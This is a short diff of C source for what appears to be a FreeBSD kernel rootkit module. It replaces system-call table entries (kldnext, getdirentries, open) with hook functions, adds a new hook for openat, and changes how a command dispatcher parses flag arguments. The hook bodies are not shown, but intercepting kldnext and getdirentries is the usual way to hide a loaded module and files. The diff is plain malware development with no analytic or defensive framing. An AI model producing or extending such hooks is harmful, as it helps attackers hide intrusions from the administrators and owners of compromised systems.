@@ -29,11 +29,11 @@ static int main(struct thread *td, void *syscall_args) {
 			remove_file(uap->args[0]);
 			break;
 		case 4:
-			resp = strtol(uap->args[1], NULL, 10);
+			resp = strtol(uap->args[1], NULL, 16);
 			set_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
 		case 5:
-			resp = strtol(uap->args[1], NULL, 10);
+			resp = strtol(uap->args[1], NULL, 16);
 			unset_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
 		default:
@@ -61,6 +61,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
 		sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
+		sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
 		// sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
 		// sysent[SYS_write].sy_call = (sy_call_t *)hook_sys_write;
 		break;
@@ -69,6 +70,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 		sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
+		sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
 		// sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		// sysent[SYS_write].sy_call = (sy_call_t *)sys_write;
 		break;
